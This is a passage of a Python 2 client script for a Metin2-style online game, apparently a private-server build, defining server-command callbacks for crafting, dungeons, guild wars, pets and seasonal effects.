		return True

	def OnPressExitKey(self):
		self.interface.ToggleSystemDialog()
		return True

	## BINARY CALLBACK
	######################################################################################

	# WEDDING
	def BINARY_LoverInfo(self, name, lovePoint):
		if self.interface.wndMessenger:
			self.interface.wndMessenger.OnAddLover(name, lovePoint)
		if self.affectShower:
			self.affectShower.SetLoverInfo(name, lovePoint)

	def BINARY_UpdateLovePoint(self, lovePoint):
		if self.interface.wndMessenger:
			self.interface.wndMessenger.OnUpdateLovePoint(lovePoint)
		if self.affectShower:
			self.affectShower.OnUpdateLovePoint(lovePoint)
	# END_OF_WEDDING

	# QUEST_CONFIRM
	def BINARY_OnQuestConfirm(self, msg, timeout, pid):
		confirmDialog = uicommon.QuestionDialogWithTimeLimit()
		confirmDialog.Open(msg, timeout)
		confirmDialog.SetAcceptEvent(lambda answer=True, pid=pid: net.SendQuestConfirmPacket(answer, pid) or self.confirmDialog.Hide())
		confirmDialog.SetCancelEvent(lambda answer=False, pid=pid: net.SendQuestConfirmPacket(answer, pid) or self.confirmDialog.Hide())
		self.confirmDialog = confirmDialog
	# END_OF_QUEST_CONFIRM

	# GIFT command
	def Gift_Show(self):
		self.interface.ShowGift()

	# CUBE
	def BINARY_Cube_Open(self, npcVNUM):
		self.currentCubeNPC = npcVNUM

		self.interface.OpenCubeWindow()


		if npcVNUM not in self.cubeInformation:
			net.SendChatPacket("/cube r_info")
		else:
			cubeInfoList = self.cubeInformation[npcVNUM]

			i = 0
			for cubeInfo in cubeInfoList:
				self.interface.wndCube.AddCubeResultItem(cubeInfo["vnum"], cubeInfo["count"])

				j = 0
				for materialList in cubeInfo["materialList"]:
					for materialInfo in materialList:
						itemVnum, itemCount = materialInfo
						self.interface.wndCube.AddMaterialInfo(i, j, itemVnum, itemCount)
					j = j + 1

				i = i + 1

			self.interface.wndCube.Refresh()

	def BINARY_Cube_Close(self):
		self.interface.CloseCubeWindow()

	def BINARY_Cube_UpdateInfo(self, gold, itemVnum, count):
		self.interface.UpdateCubeInfo(gold, itemVnum, count)

	def BINARY_Cube_Succeed(self, itemVnum, count):
		self.interface.SucceedCubeWork(itemVnum, count)
		pass

	def BINARY_Cube_Failed(self):
		self.interface.FailedCubeWork()
		pass

	def BINARY_Cube_ResultList(self, npcVNUM, listText):
		if npcVNUM == 0:
			npcVNUM = self.currentCubeNPC

		self.cubeInformation[npcVNUM] = []

		try:
			for eachInfoText in listText.split("/"):
				eachInfo = eachInfoText.split(",")
				itemVnum	= int(eachInfo[0])
				itemCount	= int(eachInfo[1])

				self.cubeInformation[npcVNUM].append({"vnum": itemVnum, "count": itemCount})
				self.interface.wndCube.AddCubeResultItem(itemVnum, itemCount)

			resultCount = len(self.cubeInformation[npcVNUM])
			requestCount = 7
			modCount = resultCount % requestCount
			splitCount = resultCount / requestCount
			for i in xrange(splitCount):
				net.SendChatPacket("/cube r_info %d %d" % (i * requestCount, requestCount))

			if 0 < modCount:
				net.SendChatPacket("/cube r_info %d %d" % (splitCount * requestCount, modCount))

		except RuntimeError, msg:
			dbg.TraceError(msg)
			return 0

		pass

	if app.ENABLE_ATTR_TRANSFER_SYSTEM:
		def BINARY_AttrTransfer_Open(self):
			self.interface.OpenAttrTransferWindow()

		def BINARY_AttrTransfer_Close(self):
			self.interface.CloseAttrTransferWindow()

		def BINARY_AttrTransfer_Success(self):
			self.interface.AttrTransferSuccess()

	def BINARY_Cube_MaterialInfo(self, startIndex, listCount, listText):
		try:
			if 3 > len(listText):
				dbg.TraceError("Wrong Cube Material Infomation")
				return 0



			eachResultList = listText.split("@")

			cubeInfo = self.cubeInformation[self.currentCubeNPC]

			itemIndex = 0
			for eachResultText in eachResultList:
				cubeInfo[startIndex + itemIndex]["materialList"] = [[], [], [], [], []]
				materialList = cubeInfo[startIndex + itemIndex]["materialList"]

				gold = 0
				splitResult = eachResultText.split("/")
				if 1 < len(splitResult):
					gold = int(splitResult[1])

				#print "splitResult : ", splitResult
				eachMaterialList = splitResult[0].split("&")

				i = 0
				for eachMaterialText in eachMaterialList:
					complicatedList = eachMaterialText.split("|")

					if 0 < len(complicatedList):
						for complicatedText in complicatedList:
							(itemVnum, itemCount) = complicatedText.split(",")
							itemVnum = int(itemVnum)
							itemCount = int(itemCount)
							self.interface.wndCube.AddMaterialInfo(itemIndex + startIndex, i, itemVnum, itemCount)

							materialList[i].append((itemVnum, itemCount))

					else:
						itemVnum, itemCount = eachMaterialText.split(",")
						itemVnum = int(itemVnum)
						itemCount = int(itemCount)
						self.interface.wndCube.AddMaterialInfo(itemIndex + startIndex, i, itemVnum, itemCount)

						materialList[i].append((itemVnum, itemCount))

					i = i + 1



				itemIndex = itemIndex + 1

			self.interface.wndCube.Refresh()


		except RuntimeError, msg:
			dbg.TraceError(msg)
			return 0

		pass

	# END_OF_CUBE

	def BINARY_Highlight_Item(self, inven_type, inven_pos):
		# @fixme003 (+if self.interface:)
		if self.interface:
			self.interface.Highligt_Item(inven_type, inven_pos)

	def BINARY_DragonSoulRefineWindow_Open(self):
		self.interface.OpenDragonSoulRefineWindow()

	def BINARY_DragonSoulRefineWindow_RefineFail(self, reason, inven_type, inven_pos):
		self.interface.FailDragonSoulRefine(reason, inven_type, inven_pos)

	def BINARY_DragonSoulRefineWindow_RefineSucceed(self, inven_type, inven_pos):
		self.interface.SucceedDragonSoulRefine(inven_type, inven_pos)

	# END of DRAGON SOUL REFINE WINDOW

	if app.ENABLE_DUNGEON_INFO_SYSTEM:
		def DungeonInfo(self, questindex):
			constinfo.dungeonData["quest_index"] = questindex

		def CleanDungeonInfo(self):
			constinfo.dungeonInfo = []

		def CleanDungeonRanking(self):
			constinfo.dungeonRanking["ranking_list"] = []
			constinfo.dungeonRanking["my_ranking"] = []

		def GetDungeonInfo(self, cmd):
			cmd = cmd.split("#")

			if cmd[0] == "INPUT":
				constinfo.INPUT_IGNORE = int(cmd[1])

			elif cmd[0] == "CMD":
				net.SendQuestInputStringPacket(constinfo.dungeonData["quest_cmd"])
				constinfo.dungeonData["quest_cmd"] = ""

			else:
				pass

		def UpdateDungeonInfo(self, status, waitTime, type, organization, levelMinLimit, levelMaxLimit, partyMemberMinLimit, partyMemberMaxLimit, mapIndex, mapCoordX, mapCoordY, cooldown, duration, entranceMapIndex, strengthBonusName, resistanceBonusName, itemVnum, itemCount, finished, fastestTime, highestDamage):
			status = int(status)
			waitTime = int(waitTime)
			type = int(type)
			organization = int(organization)
			levelMinLimit = int(levelMinLimit)
			levelMaxLimit = int(levelMaxLimit)
			partyMemberMinLimit = int(partyMemberMinLimit)
			partyMemberMaxLimit = int(partyMemberMaxLimit)
			mapIndex = int(mapIndex)
			mapCoordX = int(mapCoordX)
			mapCoordY = int(mapCoordY)
			cooldown = int(cooldown)
			duration = int(duration)
			entranceMapIndex = int(entranceMapIndex)
			strengthBonusName = str(strengthBonusName).replace("_", " ")
			resistanceBonusName = str(resistanceBonusName).replace("_", " ")
			itemVnum = int(itemVnum)
			itemCount = int(itemCount)
			finished = int(finished)
			fastestTime = int(fastestTime)
			highestDamage = int(highestDamage)
			
			constinfo.dungeonInfo.append(
				{
					"status" : status,
					"wait_time" : waitTime,
					"type" : type,
					"organization" : organization,
					"level_limit" : [levelMinLimit, levelMaxLimit],
					"party_member_limit" : [partyMemberMinLimit, partyMemberMaxLimit],
					"map_index" : mapIndex,
					"map_coords" : [mapCoordX, mapCoordY],
					"cooldown" : cooldown,
					"duration" : duration,
					"entrance_map_index" : entranceMapIndex,
					"strength_bonus" : strengthBonusName,
					"resistance_bonus" : resistanceBonusName,
					"required_item" : [itemVnum, itemCount],
					"finished" : finished,
					"fastest_time" : fastestTime,
					"highest_damage" : highestDamage
				},
			)

		def UpdateDungeonRanking(self, name, level, rankType):
			name = str(name)
			level = int(level)
			rankType = int(rankType)

			constinfo.dungeonRanking["ranking_list"].append([name, level, rankType],)

		def UpdateMyDungeonRanking(self, position, name, level, rankType):
			position = int(position)
			name = str(name)
			level = int(level)
			rankType = int(rankType)

			constinfo.dungeonRanking["my_ranking"].append([position, name, level, rankType],)

		def OpenDungeonRanking(self):
			import uidungeoninfo
			self.DungeonRank = uidungeoninfo.DungeonRank()
			self.DungeonRank.Open()

	def BINARY_SetBigMessage(self, message):
		self.interface.bigBoard.SetTip(message)

	def BINARY_SetTipMessage(self, message):
		self.interface.tipBoard.SetTip(message)

	def BINARY_AppendNotifyMessage(self, type, time = 0):
		#if app.USE_MULTIPLE_OPENING:
		if type == "TRY_AGAIN_IN_MILLESECONDS":
			leftTime = float(time) / float(1000)
			chat.AppendChat(chat.CHAT_TYPE_INFO, localeinfo.TRY_AGAIN_IN_MILLESECONDS % leftTime)
			return

		if not type in localeinfo.NOTIFY_MESSAGE:
			return

		chat.AppendChat(chat.CHAT_TYPE_INFO, localeinfo.NOTIFY_MESSAGE[type])

	def BINARY_Guild_EnterGuildArea(self, areaID):
		self.interface.BULID_EnterGuildArea(areaID)

	def BINARY_Guild_ExitGuildArea(self, areaID):
		self.interface.BULID_ExitGuildArea(areaID)

	def BINARY_GuildWar_OnSendDeclare(self, guildID):
		pass

	def BINARY_GuildWar_OnRecvDeclare(self, guildID, warType):
		mainCharacterName = player.GetMainCharacterName()
		masterName = guild.GetGuildMasterName()
		if mainCharacterName == masterName:
			self.__GuildWar_OpenAskDialog(guildID, warType)

	def BINARY_GuildWar_OnRecvPoint(self, gainGuildID, opponentGuildID, point):
		self.interface.OnRecvGuildWarPoint(gainGuildID, opponentGuildID, point)

	def BINARY_GuildWar_OnStart(self, guildSelf, guildOpp):
		self.interface.OnStartGuildWar(guildSelf, guildOpp)

	def BINARY_GuildWar_OnEnd(self, guildSelf, guildOpp):
		self.interface.OnEndGuildWar(guildSelf, guildOpp)

	def BINARY_BettingGuildWar_SetObserverMode(self, isEnable):
		self.interface.BINARY_SetObserverMode(isEnable)

	def BINARY_BettingGuildWar_UpdateObserverCount(self, observerCount):
		self.interface.wndMiniMap.UpdateObserverCount(observerCount)

	def __GuildWar_UpdateMemberCount(self, guildID1, memberCount1, guildID2, memberCount2, observerCount):
		guildID1 = int(guildID1)
		guildID2 = int(guildID2)
		memberCount1 = int(memberCount1)
		memberCount2 = int(memberCount2)
		observerCount = int(observerCount)

		self.interface.UpdateMemberCount(guildID1, memberCount1, guildID2, memberCount2)
		self.interface.wndMiniMap.UpdateObserverCount(observerCount)

	def __GuildWar_OpenAskDialog(self, guildID, warType):

		guildName = guild.GetGuildName(guildID)

		# REMOVED_GUILD_BUG_FIX
		if "Noname" == guildName:
			return
		# END_OF_REMOVED_GUILD_BUG_FIX

		import uiguild
		questionDialog = uiguild.AcceptGuildWarDialog()
		questionDialog.SAFE_SetAcceptEvent(self.__GuildWar_OnAccept)
		questionDialog.SAFE_SetCancelEvent(self.__GuildWar_OnDecline)
		questionDialog.Open(guildName, warType)

		self.guildWarQuestionDialog = questionDialog

	def __GuildWar_CloseAskDialog(self):
		self.guildWarQuestionDialog.Close()
		self.guildWarQuestionDialog = None

	def __GuildWar_OnAccept(self):

		guildName = self.guildWarQuestionDialog.GetGuildName()

		net.SendChatPacket("/war " + guildName)
		self.__GuildWar_CloseAskDialog()

		return 1

	def __GuildWar_OnDecline(self):

		guildName = self.guildWarQuestionDialog.GetGuildName()

		net.SendChatPacket("/nowar " + guildName)
		self.__GuildWar_CloseAskDialog()

		return 1

	## BINARY CALLBACK
	######################################################################################
	def __ServerCommand_Build(self):
		serverCommandList={
			"Shutdown"				: self.Shutdown,
			"SendMessage"			: self.Message,
			"teck"					: self.teck,		
			"DayMode"				: self.__DayMode_Update,
			"PRESERVE_DayMode"		: self.__PRESERVE_DayMode_Update,
			"CloseRestartWindow"	: self.__RestartDialog_Close,
			"OpenPrivateShop"		: self.__PrivateShop_Open,
			"PartyHealReady"		: self.PartyHealReady,
			"ShowMeSafeboxPassword"	: self.AskSafeboxPassword,
			"CloseSafebox"			: self.CommandCloseSafebox,

			# ITEM_MALL
			"CloseMall"				: self.CommandCloseMall,
			"ShowMeMallPassword"	: self.AskMallPassword,
			"item_mall"				: self.__ItemMall_Open,
			# END_OF_ITEM_MALL

			"RefineSuceeded"		: self.RefineSuceededMessage,
			"RefineFailed"			: self.RefineFailedMessage,
			"xmas_snow"				: self.__XMasSnow_Enable,
			"xmas_boom"				: self.__XMasBoom_Enable,
			"xmas_song"				: self.__XMasSong_Enable,
			"xmas_tree"				: self.__XMasTree_Enable,
			"newyear_boom"			: self.__XMasBoom_Enable,
			"PartyRequest"			: self.__PartyRequestQuestion,
			"PartyRequestDenied"	: self.__PartyRequestDenied,
			"horse_state"			: self.__Horse_UpdateState,
			"hide_horse_state"		: self.__Horse_HideState,
			"WarUC"					: self.__GuildWar_UpdateMemberCount,
			"test_server"			: self.__EnableTestServerFlag,
			"mall"					: self.__InGameShop_Show,
			# WEDDING
			"lover_login"			: self.__LoginLover,
			"lover_logout"			: self.__LogoutLover,
			"lover_near"			: self.__LoverNear,
			"lover_far"				: self.__LoverFar,
			"lover_divorce"			: self.__LoverDivorce,
			"PlayMusic"				: self.__PlayMusic,
			# END_OF_WEDDING
			# PRIVATE_SHOP_PRICE_LIST
			"MyShopPriceList"		: self.__PrivateShop_PriceList,
			# END_OF_PRIVATE_SHOP_PRICE_LIST
			"AttrTransferMessage" : self.AttrTransferMessage,
			"manage_exp_status" : self.ManageExpStatus,
			"BINARY_FightCancelled" : self.BINARY_FightCancelled,
		}
		
		if app.ENABLE_LETTERS_EVENT:
			serverCommandList["letters_event"] = self.OnRecvLettersEvent
		
		if app.ENABLE_INGAME_ITEMSHOP:
			serverCommandList["buycoins"] = self.__BuyCoins
		
		if app.ENABLE_INGAME_CHCHANGE:
			serverCommandList["channel"] = self.BINARY_OnChannelPacket
		
		if app.ENABLE_PVP_ADVANCED:
			serverCommandList.update({
				"BINARY_Duel_GetInfo" : self.BINARY_Duel_GetInfo,
				"BINARY_Duel_Request" : self.BINARY_Duel_Request,
				"BINARY_Duel_LiveInterface" : self.BINARY_Duel_LiveInterface,
				"BINARY_Duel_Delete" : self.BINARY_Duel_Delete,
				"equipview" : self.EquipView,
			})
		
		if app.NEW_PET_SYSTEM:
			serverCommandList.update({
				##NewPetSystem
				"PetEvolution"			: self.SetPetEvolution,
				"PetName"				: self.SetPetName,
				"PetLevel"				: self.SetPetLevel,
				"PetDuration"			: self.SetPetDuration,
				"PetBonus"				: self.SetPetBonus,
				"PetSkill"				: self.SetPetskill,
				"PetIcon"				: self.SetPetIcon,
				"PetExp"				: self.SetPetExp,
				"PetUnsummon"			: self.PetUnsummon,
				"OpenPetIncubator"		: self.OpenPetIncubator,
				"PetAge" : self.PetAge,
				##EndNewPetSystem
			})
		
		# if app.ENABLE_INGAME_CHCHANGE:
			# serverCommandList.update({
			# "channel" : self.BINARY_OnChannelPacket,
		# })
		
		if app.ENABLE_HIDE_COSTUME_SYSTEM:
			serverCommandList["hiddenstatus"] = self.OnRecvHiddenStatus
			serverCommandList["hiddenstatusyes"] = self.OnRecvHiddenStatusYes
		
		if app.ENABLE_DUNGEON_INFO_SYSTEM:
			serverCommandList.update({
				"DungeonInfo" : self.DungeonInfo,
				"CleanDungeonInfo" : self.CleanDungeonInfo,
				"CleanDungeonRanking" : self.CleanDungeonRanking,
				"GetDungeonInfo" : self.GetDungeonInfo,
				"UpdateDungeonInfo" : self.UpdateDungeonInfo,
				"UpdateDungeonRanking" : self.UpdateDungeonRanking,
				"UpdateMyDungeonRanking" : self.UpdateMyDungeonRanking,
				"OpenDungeonRanking" : self.OpenDungeonRanking,
			})

		if app.ENABLE_WHISPER_ADMIN_SYSTEM:
			serverCommandList["OnRecvWhisperAdminSystem"] = self.OnRecvWhisperAdminSystem

		if app.ENABLE_SOUL_SYSTEM:
			serverCommandList["RefineSoulSuceeded"] = self.__RefineSoulSuceededMessage
			serverCommandList["RefineSoulFailed"] = self.__RefineSoulFailedMessage
		
		if app.ENABLE_REWARD_SYSTEM:
			serverCommandList["RewardInfo"] = self.SetRewardPlayers
		
		if app.ENABLE_SWITCHBOT_WORLDARD:
			serverCommandList["SWITCHBOT_SUCCESFULL"] = self.BINARY_SWITCHBOT_SUCCEFULL
			serverCommandList["BINARY_SWITCHBOT_ALREADY"] = self.BINARY_SWITCHBOT_ALREADY
		
		if app.ENABLE_TRACK_WINDOW:
			serverCommandList["TrackDungeonInfo"] = self.interface.TrackDungeonInfo
			serverCommandList["TrackBossInfo"] = self.interface.TrackBossInfo
		
		self.serverCommander=stringcommander.Analyzer()
		if app.ENABLE_DEFENSE_WAVE:
			serverCommandList["BINARY_Update_Mast_HP"] = self.BINARY_Update_Mast_HP
			serverCommandList["BINARY_Update_Mast_Window"] = self.BINARY_Update_Mast_Window
			serverCommandList["BINARY_Update_Mast_Timer"] = self.BINARY_Update_Mast_Timer
		
		if app.ENABLE_CHOOSE_DOCTRINE_GUI:
			serverCommandList["recv_doctrine"] = self.RecvDoctrineGui
		
		if app.ENABLE_HALLOWEEN_EVENT_2022:
			serverCommandList["halloween_event"] = self.OnRecvHalloweenEvent
		
		if app.ENABLE_OKEY_CARD_GAME:
			serverCommandList["okeycards_event"] = self.OnRecvOkeyCardsEvent

		if app.USE_WHEEL_OF_FORTUNE:
			serverCommandList["SetItemData"] = self.interface.SetItemData
			serverCommandList["OnSetWhell"] = self.interface.OnSetWhell
			serverCommandList["GetGiftData"] = self.interface.GetGiftData
			serverCommandList["update_dragon_coins"] = self.OnUpdateDragonCoins
		
		if app.USE_ATTR_6TH_7TH:
			serverCommandList["__OpenAttr67AddDlg"] = self.__OpenAttr67AddDlg

		if app.USE_PICKUP_FILTER:
			serverCommandList["sendftrset"] = self.SendFilterSettings

			if app.USE_AUTO_HUNT or app.ENABLE_PREMIUM_PLAYERS:
				serverCommandList["cleaftrset"] = self.ClearFilterSettings

		if app.USE_AUTO_AGGREGATE:
			serverCommandList["autoaggr"] = self.SetBraveCapeStatus

		for serverCommandItem in serverCommandList.items():
			self.serverCommander.SAFE_RegisterCallBack(
				serverCommandItem[0], serverCommandItem[1]
			)
		
		if app.ENABLE_MELEY_LAIR_DUNGEON:
			self.serverCommander.SAFE_RegisterCallBack("meley_open", self.OpenMeleyRanking)
			self.serverCommander.SAFE_RegisterCallBack("meley_rank", self.AddRankMeleyRanking)
		
		if app.ENABLE_SORT_INVEN:
			self.serverCommander.SAFE_RegisterCallBack("inv_sort_done", self.Sort_InventoryDone)
			self.serverCommander.SAFE_RegisterCallBack("ext_sort_done", self.Sort_ExtraInventoryDone)
		if app.ENABLE_BIOLOGIST_UI:
			self.serverCommander.SAFE_RegisterCallBack("biologist", self.DoBiologist)
			self.serverCommander.SAFE_RegisterCallBack("biologist_delivered", self.DoBiologistDelivered)
			self.serverCommander.SAFE_RegisterCallBack("biologist_time", self.DoBiologistTime)
			self.serverCommander.SAFE_RegisterCallBack("biologist_reward", self.DoBiologistReward)
			self.serverCommander.SAFE_RegisterCallBack("biologist_close", self.DoBiologistClose)
			self.serverCommander.SAFE_RegisterCallBack("biologist_next", self.DoBiologistNext)
			self.serverCommander.SAFE_RegisterCallBack("biologistch_clear", self.DoBiologistChangeClear)
			self.serverCommander.SAFE_RegisterCallBack("biologistch_append", self.DoBiologistChangeAppend)
			self.serverCommander.SAFE_RegisterCallBack("biologistch_open", self.DoBiologistChangeOpen)
			self.serverCommander.SAFE_RegisterCallBack("biologistch_close", self.DoBiologistChangeClose)
		
		if app.ENABLE_WHISPER_ADMIN_SYSTEM:
			self.serverCommander.SAFE_RegisterCallBack("recv_whispersys", self.RecvWhisperSystem)

	if app.ENABLE_CHOOSE_DOCTRINE_GUI:
		def RecvDoctrineGui(self):
			if self.interface:
				self.interface.OnRecvDoctrine()

	if app.ENABLE_BIOLOGIST_UI:
		def DoBiologistTime(self, time):
			n = int(time)
			if n == 1:
				constinfo.haveBiologist = 0
				constinfo.remainBiologistTime = 0
			else:
				constinfo.haveBiologist = 1
				constinfo.remainBiologistTime = n

		def DoBiologist(self, args):
			if self.interface:
				self.interface.OpenBiologist(args)

		def DoBiologistDelivered(self, args):
			if self.interface:
				self.interface.DeliveredBiologist(args)

		def DoBiologistReward(self, args):
			if self.interface:
				self.interface.RewardBiologist(args)

		def DoBiologistClose(self):
			if self.interface:
				self.interface.CloseBiologist()

		def DoBiologistNext(self, args):
			if self.interface:
				self.interface.NextBiologist(args)

		def DoBiologistChangeClear(self):
			if self.interface:
				self.interface.ClearBiologistChange()

		def DoBiologistChangeAppend(self, args):
			if self.interface:
				self.interface.AppendBiologistChange(args)

		def DoBiologistChangeOpen(self):
			if self.interface:
				self.interface.OpenBiologistChange()

		def DoBiologistChangeClose(self):
			if self.interface:
				self.interface.CloseBiologistChange()

	if app.ENABLE_SORT_INVEN:
		def Sort_InventoryDone(self):
			if self.interface:
				self.interface.Sort_InventoryDone()

		def Sort_ExtraInventoryDone(self):
			if self.interface:
				self.interface.Sort_ExtraInventoryDone()

	def ManageExpStatus(self, arg):
		constinfo.exp_status = int(arg)
		if self.interface:
			self.interface.RefreshExpBtn()


	if app.ENABLE_CUBE_RENEWAL_WORLDARD:
		def BINARY_CUBE_RENEWAL_OPEN(self):
			if self.interface:
				self.interface.BINARY_CUBE_RENEWAL_OPEN()

	def BINARY_ServerCommand_Run(self, line):
		#dbg.TraceError(line)
		try:
			#print " BINARY_ServerCommand_Run", line
			return self.serverCommander.Run(line)
		except RuntimeError, msg:
			dbg.TraceError(msg)
			return 0

	def __ProcessPreservedServerCommand(self):
		try:
			command = net.GetPreservedServerCommand()
			while command:
				print " __ProcessPreservedServerCommand", command
				self.serverCommander.Run(command)
				command = net.GetPreservedServerCommand()
		except RuntimeError, msg:
			dbg.TraceError(msg)
			return 0

	if app.ENABLE_SWITCHBOT_WORLDARD:
		def BINARY_SWITCHBOT_OPEN(self):
			self.interface.BINARY_SWITCHBOT_OPEN()

		def BINARY_SWITCHBOT_CLEAR_INFO(self):
			self.interface.BINARY_SWITCHBOT_CLEAR_INFO()

		def BINARY_SWITCHBOT_INFO_BONUS(self,id_bonus,bonus_value_0,bonus_value_1,bonus_value_2,bonus_value_3,bonus_value_4):
			self.interface.BINARY_SWITCHBOT_INFO_BONUS(id_bonus,bonus_value_0,bonus_value_1,bonus_value_2,bonus_value_3,bonus_value_4)

		def BINARY_SWITCHBOT_INFO_EXTRA(self):
			self.interface.BINARY_SWITCHBOT_INFO_EXTRA()

		def BINARY_SWITCHBOT_SUCCEFULL(self,count):
			self.PopupMessage(localeinfo.SWITCHBOT_ALERT % (int(count)))

		def BINARY_SWITCHBOT_ALREADY(self):
			self.PopupMessage(localeinfo.SWITCHBOT_NORMAL_TEXT8)

	def PartyHealReady(self):
		self.interface.PartyHealReady()

	def AskSafeboxPassword(self):
		self.interface.AskSafeboxPassword()

	# ITEM_MALL
	def AskMallPassword(self):
		self.interface.AskMallPassword()

	def __ItemMall_Open(self):
		self.interface.OpenItemMall();

	def AttrTransferMessage(self):
		snd.PlaySound("sound/ui/make_soket.wav")
		self.PopupMessage(localeinfo.COMB_ALERT)

	def CommandCloseMall(self):
		self.interface.CommandCloseMall()
	# END_OF_ITEM_MALL

	def RefineSuceededMessage(self):
		snd.PlaySound("sound/ui/make_soket.wav")
		self.PopupMessage(localeinfo.REFINE_SUCCESS)
		if app.USE_AUTO_REFINE:
			self.interface.RefineFail(False)

	def RefineFailedMessage(self):
		snd.PlaySound("sound/ui/jaeryun_fail.wav")
		self.PopupMessage(localeinfo.REFINE_FAILURE)
		if app.USE_AUTO_REFINE:
			self.interface.RefineFail(True)

	if app.ENABLE_SOUL_SYSTEM:
		def __RefineSoulSuceededMessage(self):
			snd.PlaySound("sound/ui/make_soket.wav")
			self.PopupMessage(localeinfo.SOUL_REFINE_SUCCESS)

		def __RefineSoulFailedMessage(self):
			snd.PlaySound("sound/ui/jaeryun_fail.wav")
			self.PopupMessage(localeinfo.SOUL_REFINE_FAILURE)

	def CommandCloseSafebox(self):
		self.interface.CommandCloseSafebox()

	# PRIVATE_SHOP_PRICE_LIST
	def __PrivateShop_PriceList(self, itemVNum, itemPrice):
		uiprivateshopbuilder.SetPrivateShopItemPrice(itemVNum, itemPrice)
	# END_OF_PRIVATE_SHOP_PRICE_LIST

	def __Horse_HideState(self):
		self.affectShower.SetHorseState(0, 0, 0)

	if app.ENABLE_PVP_ADVANCED:
		def ClickPvpEquipment(self):
			if constinfo.equipview == 0:
				net.SendChatPacket("/pvp_block_equipment BLOCK")
			else:
				net.SendChatPacket("/pvp_block_equipment UNBLOCK")

		def BINARY_Duel_GetInfo(self, a, b, c, d, e, f, g, h):
			self.wndDuelGui.OpenDialog(a, b, c, d, e, f, g, h)

		def BINARY_Duel_Request(self, a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q):
			self.wndDuelGui.OpenDialog(a, b, c, d, e, f, g, h)
			self.wndDuelGui.Selected([int(i), int(j), int(k), int(l), int(m), int(n), int(o), int(p), int(q)])

		def BINARY_Duel_Delete(self):
			self.interface.CloseEquipmentDialog(self.wndDuelGui.vid)
			self.wndDuelGui.Remove()

			if self.wndDuelLive:
				self.wndDuelLive.Close()

		def BINARY_Duel_LiveInterface(self, a, b, c, d, e, f, g, h, i, j, k, l):
			miniPetIsShowing = False
			if app.NEW_PET_SYSTEM:
				if self.petmini.IsShow():
					miniPetIsShowing = True
			
			if self.wndDuelLive:
				self.wndDuelLive.ShowInformations([str(a), int(b), int(c), int(d), int(e), int(f), int(g), int(h), int(i), int(j), int(k), int(l)], miniPetIsShowing)

		def EquipView(self, s):
			i = 0
			try:
				i = int(s)
			except:
				pass
			
			constinfo.equipview = i
			# if self.interface:
				# self.interface.OnRefreshBtnPvpMinimap()

	def BINARY_SetDialogMessage(self, msg):
		self.wndMsg = uicommon.PopupDialog()
		self.wndMsg.SetWidth(550)
		self.wndMsg.SetText(msg)
		self.wndMsg.Show()

	def __Horse_UpdateState(self, level, health, battery):
		self.affectShower.SetHorseState(int(level), int(health), int(battery))

	def __IsXMasMap(self):
		mapDict = ( "metin2_map_n_flame_01",
					"metin2_map_n_desert_01",
					"metin2_map_spiderdungeon",
					"metin2_map_deviltower1", )

		if background.GetCurrentMapName() in mapDict:
			return False

		return True

	def __XMasSnow_Enable(self, mode):
		self.__XMasSong_Enable(mode)
		if "1"==mode:
			if app.USE_ENVIRONMENT_OPTIONS:
				background.SetXMasShowEvent(1)
			
			if not self.__IsXMasMap():
				return
			
			print "XMAS_SNOW ON"
			background.EnableSnow(1)
		else:
			if app.USE_ENVIRONMENT_OPTIONS:
				background.SetXMasShowEvent(0)
			
			print "XMAS_SNOW OFF"
			background.EnableSnow(0)

	def __XMasBoom_Enable(self, mode):
		if "1"==mode:
			if app.USE_ENVIRONMENT_OPTIONS:
				if not background.IsBoomMap():
					return
			else:
				if not self.__IsXMasMap():
					return

			print "XMAS_BOOM ON"
			self.__DayMode_Update("dark")
			self.enableXMasBoom = True
			self.startTimeXMasBoom = app.GetTime()
		else:
			print "XMAS_BOOM OFF"
			self.__DayMode_Update("light")
			self.enableXMasBoom = False

	def __XMasTree_Enable(self, grade):

		print "XMAS_TREE ", grade
		background.SetXMasTree(int(grade))

	def __XMasSong_Enable(self, mode):
		if "1"==mode:
			print "XMAS_SONG ON"

			XMAS_BGM = "xmas.mp3"

			if app.IsExistFile("bgm/" + XMAS_BGM)==1:
				if musicinfo.fieldMusic != "":
					snd.FadeOutMusic("bgm/" + musicinfo.fieldMusic)

				musicinfo.fieldMusic=XMAS_BGM
				snd.FadeInMusic("bgm/" + musicinfo.fieldMusic)

		else:
			print "XMAS_SONG OFF"

			if musicinfo.fieldMusic != "":
				snd.FadeOutMusic("bgm/" + musicinfo.fieldMusic)

			musicinfo.fieldMusic=musicinfo.METIN2THEMA
			snd.FadeInMusic("bgm/" + musicinfo.fieldMusic)

	def __RestartDialog_Close(self):
		self.interface.CloseRestartDialog()

	## PrivateShop
	def __PrivateShop_Open(self):
		self.interface.OpenPrivateShopInputNameDialog()

	def BINARY_PrivateShop_Appear(self, vid, text):
		self.interface.AppearPrivateShop(vid, text)

	def BINARY_PrivateShop_Disappear(self, vid):
		self.interface.DisappearPrivateShop(vid)

	## DayMode
	def __PRESERVE_DayMode_Update(self, mode):
		if "light"==mode:
			background.SetEnvironmentData(0)
		elif "dark"==mode:

			if not self.__IsXMasMap():
				return


			background.RegisterEnvironmentData(1, constinfo.ENVIRONMENT_NIGHT)
			background.SetEnvironmentData(1)

	def __DayMode_Update(self, mode):
		return
		#if app.USE_ENVIRONMENT_OPTIONS:
		#	return
		#if "light"==mode:
		#	self.curtain.SAFE_FadeOut(self.__DayMode_OnCompleteChangeToLight)
		#elif "dark"==mode:
		#	if not self.__IsXMasMap():
		#		return
		#	
		#	self.curtain.SAFE_FadeOut(self.__DayMode_OnCompleteChangeToDark)

	def __DayMode_Update(self, mode):
		if "light"==mode:
			systemSetting.SetEnvironment(0)
		elif "dark"==mode:
			systemSetting.SetEnvironment(1)

	#def __DayMode_OnCompleteChangeToLight(self):
	#	background.SetEnvironmentData(0)
	#	self.curtain.FadeIn()
	#
	#def __DayMode_OnCompleteChangeToDark(self):
	#	background.RegisterEnvironmentData(1, constinfo.ENVIRONMENT_NIGHT)
	#	background.SetEnvironmentData(1)
	#	self.curtain.FadeIn()

	## XMasBoom
	def __XMasBoom_Update(self):

		self.BOOM_DATA_LIST = ( (2, 5), (5, 2), (7, 3), (10, 3), (20, 5) )
		if self.indexXMasBoom >= len(self.BOOM_DATA_LIST):
			return

		boomTime = self.BOOM_DATA_LIST[self.indexXMasBoom][0]
		boomCount = self.BOOM_DATA_LIST[self.indexXMasBoom][1]

		if app.GetTime() - self.startTimeXMasBoom > boomTime:

			self.indexXMasBoom += 1

			for i in xrange(boomCount):
